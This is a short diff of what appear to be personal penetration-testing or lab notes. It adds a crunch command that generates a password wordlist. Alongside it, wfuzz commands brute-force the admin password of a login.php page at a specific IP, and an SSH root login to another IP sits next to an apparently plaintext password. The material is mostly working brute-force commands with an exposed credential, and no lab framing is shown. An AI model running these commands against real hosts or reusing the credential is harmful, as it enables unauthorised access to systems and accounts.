@@ -65,6 +65,9 @@ ssh-keygen -R 45.79.197.235
 ssh root@45.79.197.235
 Lamp$$205909$$@@voiture_maison_toillette
 
+crunch 1 4 123 -o passwords.txt
+
+
 GET : wfuzz -c -z file,passwords.txt  --hc 200 "http://45.79.211.212/login.php?login=admin&password=FUZZ"
 wfuzz -c -z file,passwords.txt  --hh 607 "http://45.79.211.212/login.php?login=admin&password=FUZZ"
 wfuzz -c -z file,passwords.txt  --hs "Error" "http://45.79.211.212/login.php?login=admin&password=FUZZ"
